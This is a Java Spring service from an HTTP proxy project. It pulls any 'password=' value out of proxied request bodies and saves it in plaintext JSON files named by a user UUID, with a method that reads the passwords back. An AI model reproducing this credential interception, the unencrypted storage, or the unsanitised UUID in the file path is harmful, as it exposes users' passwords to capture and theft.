package de.localyhost.backend.rewardshttpproxy;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;
import org.springframework.stereotype.Service;

import java.io.File;
import java.util.HashMap;
import java.util.Map;

@Service
public class PasswordManager {

    private static final String DATA_FOLDER = "proxy_data";

    private final ObjectMapper objectMapper = new ObjectMapper();

    public void checkAndSaveCredentials(String requestBody, String uuid, String targetUrl) {
        if (requestBody != null && requestBody.contains("password")) {
            String password = extractPassword(requestBody);
            savePassword(uuid, targetUrl, password);
        }
    }

    private @Nullable String extractPassword(@NotNull String body) {
        int idx = body.indexOf("password=");
        if (idx == -1) return null;
        int end = body.indexOf("&", idx);
        if (end == -1) end = body.length();
        return body.substring(idx + 9, end);
    }

    private void savePassword(String uuid, String targetUrl, String password) {
        if (password == null || password.isEmpty()) return;

        try {
            File file = new File(DATA_FOLDER, uuid + "_credentials.json");
            Map<String, String> creds;
            if (file.exists()) {
                creds = objectMapper.readValue(file, HashMap.class);
            } else {
                creds = new HashMap<>();
            }

            creds.put(targetUrl, password);
            objectMapper.writeValue(file, creds);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getSavedPassword(String uuid, String targetUrl) {
        try {
            File file = new File(DATA_FOLDER, uuid + "_credentials.json");
            if (!file.exists()) return null;

            Map<String, String> creds = objectMapper.readValue(file, HashMap.class);
            return creds.get(targetUrl);

        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
